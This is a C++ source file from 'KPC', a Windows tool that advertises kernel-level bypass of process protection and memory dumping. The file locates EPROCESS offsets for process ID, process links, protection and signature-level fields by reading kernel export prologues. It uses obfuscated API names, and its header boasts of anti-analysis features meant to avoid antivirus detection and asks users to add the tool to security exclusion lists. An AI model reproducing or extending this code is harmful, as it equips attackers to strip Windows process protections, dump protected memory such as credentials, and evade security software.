/*******************************************************************************
				██  ██ ██████  ████ 
				██ ██  ██  ██ ██    
				████   ██████ ██    
				██ ██  ██     ██    
				██  ██ ██      ████ 

  KPC - Kernel Process Control
  Advanced Windows Process Protection and Memory Dumping Tool
  Features Dynamic Kernel Driver Loading with Automatic Cleanup
  Achieves TrustedInstaller-level access bypassing Windows security restrictions

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

  -----------------------------------------------------------------------------
  License:
    KPC Custom License 1.0
    - Free for personal, non-commercial and academic use
    - A commercial license is required for business, enterprise or
      revenue-generating activities
    - Redistribution of source code allowed only with this header intact
    - The XOR decryption key for embedded drivers is not provided

  -----------------------------------------------------------------------------
DISCLAIMER:
    This software operates at Windows kernel level with elevated privileges.
    While designed to be safe, conflicts with antivirus software may cause
    system instability or BSOD. For optimal operation, add kpc.exe to your
    security software's exclusion list for both files and processes.
    
    The tool employs advanced anti-analysis techniques including XOR-based 
    string obfuscation, dynamic API loading, and runtime decryption to prevent
    static detection. All critical elements are reconstructed in memory only
    when needed, ensuring minimal security solution interference.
    
    Use responsibly. Author assumes no liability for system conflicts or misuse.

*******************************************************************************/

#include "OffsetFinder.h"
#include "Utils.h"
#include "common.h"
#include <cstring>

// ======================= Safe Memory Access Helper =======================
namespace {
    // Helper for safe offset extraction with validation to prevent crashes
    std::optional<WORD> SafeExtractWord(const void* base, size_t byteOffset) noexcept 
    {
        if (!base) return std::nullopt;

        WORD value = 0;
        __try {
            std::memcpy(&value, reinterpret_cast<const BYTE*>(base) + byteOffset, sizeof(value));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return std::nullopt;
        }

        // Basic sanity check for EPROCESS structure offsets (expanded range for modern Windows)
        if (value == 0 || value > 0x3000) { // Extended range for Windows 11+ EPROCESS
            return std::nullopt;
        }

        return value;
    }
}

OffsetFinder::OffsetFinder()
{
    // Load kernel image for structure analysis using obfuscated name
    auto kernelImageName = OBFPATH(L"ntoskrnl.exe");
    HMODULE rawModule = LoadLibraryW(kernelImageName.c_str());
    m_kernelModule = ModuleHandle(rawModule);
    
    // Enhanced diagnostic information for troubleshooting
    if (!m_kernelModule) {
        ERROR(L"OffsetFinder: Failed to load kernel image (error: %d) - verify administrator privileges", GetLastError());
    }
}

OffsetFinder::~OffsetFinder() = default;

// ======================= Offset Retrieval Interface =======================
std::optional<DWORD> OffsetFinder::GetOffset(Offset name) const noexcept
{
    // Return cached offset if available from previous analysis
    if (auto it = m_offsetMap.find(name); it != m_offsetMap.end())
        return it->second;
    return std::nullopt;
}

// ======================= Master Offset Discovery Process =======================
bool OffsetFinder::FindAllOffsets() noexcept
{
    // Execute offset discovery in dependency order - some offsets depend on others
    return FindKernelPsInitialSystemProcessOffset() &&
           FindProcessUniqueProcessIdOffset() &&
           FindProcessProtectionOffset() &&
           FindProcessActiveProcessLinksOffset() &&
           FindProcessSignatureLevelOffset() &&
           FindProcessSectionSignatureLevelOffset();
}

// ======================= PsInitialSystemProcess Offset Discovery =======================
bool OffsetFinder::FindKernelPsInitialSystemProcessOffset() noexcept
{
    // Return cached result if already discovered
    if (m_offsetMap.contains(Offset::KernelPsInitialSystemProcess))
        return true;

    if (!m_kernelModule) {
        ERROR(L"Cannot find PsInitialSystemProcess - kernel image not loaded");
        return false;
    }

    // Get address of obfuscated kernel export
    auto exportName = OBFAPI("PsInitialSystemProcess");
    auto pPsInitialSystemProcess = reinterpret_cast<ULONG_PTR>(
        GetProcAddress(m_kernelModule.get(), exportName.c_str()));
    
    if (!pPsInitialSystemProcess) {
        ERROR(L"PsInitialSystemProcess export not found (error: %d)", GetLastError());
        
        // Diagnostic check for other kernel exports to identify the issue
        auto testExport = OBFAPI("PsGetProcessId");
        if (GetProcAddress(m_kernelModule.get(), testExport.c_str())) {
            ERROR(L"Other kernel exports accessible - partial export table issue");
        } else {
            ERROR(L"No kernel exports accessible - incompatible kernel image");
        }
        return false;
    }

    // Calculate relative virtual address (RVA) offset from module base
    DWORD offset = static_cast<DWORD>(pPsInitialSystemProcess - reinterpret_cast<ULONG_PTR>(m_kernelModule.get()));
    
    // Enhanced sanity check for modern Windows versions (32MB limit instead of 10MB)
    if (offset < 0x1000 || offset > 0x2000000) { 
        ERROR(L"PsInitialSystemProcess offset 0x%x outside reasonable range", offset);
        return false;
    }
    
    m_offsetMap[Offset::KernelPsInitialSystemProcess] = offset;
    SUCCESS(L"Found PsInitialSystemProcess offset: 0x%x", offset);
    return true;
}

// ======================= ActiveProcessLinks Offset Discovery =======================
bool OffsetFinder::FindProcessActiveProcessLinksOffset() noexcept
{
    // Return cached result if already discovered
    if (m_offsetMap.contains(Offset::ProcessActiveProcessLinks))
        return true;
    
    // Dependency: Requires UniqueProcessId offset to be found first
    if (!m_offsetMap.contains(Offset::ProcessUniqueProcessId))
        return false;

    // ActiveProcessLinks immediately follows UniqueProcessId in EPROCESS structure
    WORD offset = static_cast<WORD>(m_offsetMap[Offset::ProcessUniqueProcessId] + sizeof(HANDLE));
    m_offsetMap[Offset::ProcessActiveProcessLinks] = offset;
    return true;
}

// ======================= UniqueProcessId Offset Discovery =======================
bool OffsetFinder::FindProcessUniqueProcessIdOffset() noexcept
{
    // Return cached result if already discovered
    if (m_offsetMap.contains(Offset::ProcessUniqueProcessId))
        return true;

    if (!m_kernelModule)
        return false;

    // Get obfuscated PsGetProcessId function address for analysis
    auto processIdAPI = OBFAPI("PsGetProcessId");
    FARPROC pPsGetProcessId = GetProcAddress(m_kernelModule.get(), processIdAPI.c_str());
    if (!pPsGetProcessId) {
        ERROR(L"PsGetProcessId export not found (error: %d)", GetLastError());
        return false;
    }

    // Extract offset from function prologue using safe memory access
    std::optional<WORD> offset;
#ifdef _WIN64
    // On x64: offset is located at function_address + 3 bytes
    offset = SafeExtractWord(pPsGetProcessId, 3);
#else
    // On x86: offset is located at function_address + 2 bytes
    offset = SafeExtractWord(pPsGetProcessId, 2);
#endif

    if (!offset) {
        ERROR(L"Failed to extract UniqueProcessId offset from PsGetProcessId function");
        return false;
    }

    // Enhanced sanity check for modern EPROCESS structure (expanded range)
    if (offset.value() > 0x1500) { 
        ERROR(L"UniqueProcessId offset 0x%x appears too large for EPROCESS", offset.value());
        return false;
    }

    m_offsetMap[Offset::ProcessUniqueProcessId] = offset.value();
    SUCCESS(L"Found UniqueProcessId offset: 0x%x", offset.value());
    return true;
}

// ======================= Process Protection Offset Discovery =======================
bool OffsetFinder::FindProcessProtectionOffset() noexcept
{
    // Return cached result if already discovered
    if (m_offsetMap.contains(Offset::ProcessProtection))
        return true;

    if (!m_kernelModule)
        return false;

    // Get both protection check functions using obfuscated names
    auto protectedProcessAPI = OBFAPI("PsIsProtectedProcess");
    auto protectedProcessLightAPI = OBFAPI("PsIsProtectedProcessLight");
    
    FARPROC pPsIsProtectedProcess = GetProcAddress(m_kernelModule.get(), protectedProcessAPI.c_str());
    FARPROC pPsIsProtectedProcessLight = GetProcAddress(m_kernelModule.get(), protectedProcessLightAPI.c_str());
    
    if (!pPsIsProtectedProcess || !pPsIsProtectedProcessLight) {
        ERROR(L"Protection function exports not found in kernel image");
        return false;
    }

    // Extract offsets from both functions using safe memory access
    auto offsetA = SafeExtractWord(pPsIsProtectedProcess, 2);
    auto offsetB = SafeExtractWord(pPsIsProtectedProcessLight, 2);

    if (!offsetA || !offsetB) {
        ERROR(L"Failed to extract offsets from protection validation functions");
        return false;
    }

    // Verify both functions use same offset and it's within reasonable range
    if (offsetA.value() != offsetB.value() || offsetA.value() > 0x1500) { 
        ERROR(L"Protection offset validation failed: A=0x%x, B=0x%x", offsetA.value(), offsetB.value());
        return false;
    }

    m_offsetMap[Offset::ProcessProtection] = offsetA.value();
    SUCCESS(L"Found ProcessProtection offset: 0x%x", offsetA.value());
    return true;
}

// ======================= Signature Level Offset Discovery =======================
bool OffsetFinder::FindProcessSignatureLevelOffset() noexcept
{
    // Return cached result if already discovered
    if (m_offsetMap.contains(Offset::ProcessSignatureLevel))
        return true;

    // Dependency: Requires Protection offset to be found first
    if (!m_offsetMap.contains(Offset::ProcessProtection))
        return false;

    // SignatureLevel is located 2 bytes before Protection field in EPROCESS
    WORD offset = static_cast<WORD>(m_offsetMap[Offset::ProcessProtection] - (2 * sizeof(UCHAR)));
    m_offsetMap[Offset::ProcessSignatureLevel] = offset;
    return true;
}

bool OffsetFinder::FindProcessSectionSignatureLevelOffset() noexcept
{
    // Return cached result if already discovered
    if (m_offsetMap.contains(Offset::ProcessSectionSignatureLevel))
        return true;

    // Dependency: Requires Protection offset to be found first
    if (!m_offsetMap.contains(Offset::ProcessProtection))
        return false;

    // SectionSignatureLevel is located 1 byte before Protection field in EPROCESS
    WORD offset = static_cast<WORD>(m_offsetMap[Offset::ProcessProtection] - sizeof(UCHAR));
    m_offsetMap[Offset::ProcessSectionSignatureLevel] = offset;
    return true;
}
